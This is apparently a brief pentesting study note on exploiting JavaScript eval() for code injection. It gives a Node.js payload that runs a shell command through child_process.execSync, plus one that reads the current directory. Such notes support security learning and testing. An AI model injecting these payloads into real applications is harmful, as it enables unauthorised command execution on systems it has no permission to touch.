---
title: Javascript — eval()
date: 2023-11-07
tags:
  - pentesting/web-exploitation
---

# Javascript — eval()

---

- can be used to inject and execute arbitrary code

## [[Code Injection]]

To list the files in the current directory: 

```javascript
require('child_process').execSync('ls').toString()
```

To get the current working directory:

```javascript
process.cwd()
```